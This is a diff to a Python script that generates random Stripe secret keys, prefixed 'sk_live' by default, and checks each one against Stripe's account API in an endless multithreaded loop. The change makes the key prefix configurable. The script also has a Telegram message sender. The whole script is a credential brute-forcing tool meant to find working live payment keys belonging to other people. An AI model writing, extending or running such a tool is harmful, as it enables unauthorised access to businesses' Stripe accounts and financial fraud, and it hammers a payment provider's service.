@@ -45,10 +45,10 @@ CHAT_ID = '<CHAT_ID>'
 TOPIC_ID = '<ID>'  
 
 # ─── Function: Generate stripe api key ────────────────────────────────────
-def generate_live_stripe_api_key(key_length):
+def generate_live_stripe_api_key(key_length,key_prefix):
     characters = string.ascii_letters + string.digits
     random_string = ''.join(secrets.choice(characters) for _ in range(key_length))
-    api_key = f"sk_live_{random_string}"
+    api_key = f"{key_prefix}_{random_string}"
     return api_key
 # ─── Function: Telegram Message Sender ────────────────────────────────────
 def send_telegram_message(message):
@@ -65,9 +65,9 @@ def send_telegram_message(message):
     except requests.RequestException as e:
         logger.error(f"[x] Telegram request failed with error: {e}")
 # ─── Function: Check Stripe Key ────────────────────────────────────
-def check_key_validity(sem, key_length):
+def check_key_validity(sem, key_length,key_prefix):
     with sem: 
-        api_key = generate_live_stripe_api_key(key_length)
+        api_key = generate_live_stripe_api_key(key_length,key_prefix)
         try:
             url = "https://api.stripe.com/v1/account"
             headers = {"Authorization": f"Bearer {api_key}"}
@@ -84,12 +84,12 @@ def check_key_validity(sem, key_length):
         except requests.RequestException as e:
             logger.error(f"[x] Request failed for key: {api_key} with error: {e}")
 # ─── Configs: Threads Configuration ────────────────────────────────────
-def run_with_threads(max_workers, key_length):
+def run_with_threads(max_workers, key_length,key_prefix):
     sem = Semaphore(max_workers)
     
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         while True:
-            executor.submit(check_key_validity, sem, key_length)
+            executor.submit(check_key_validity, sem, key_length,key_prefix)
             time.sleep(0.1) 
 
 # ─── Main Function: GET Argument & Running APP ────────────────────────────────────
@@ -97,6 +97,7 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="A script to check the validity of Stripe keys.")
     parser.add_argument("-t", type=int, default=30, help="Number of concurrent threads (default is 30)")
     parser.add_argument("-l", type=int, default=36, help="Length of the generated API key (default is 36)")
+    parser.add_argument("-s", type=str, default="sk_live", help="Prefix for the generated API key (default is 'sk_live')")
     args = parser.parse_args()
     
-    run_with_threads(args.t, args.l)
+    run_with_threads(args.t, args.l,args.s)
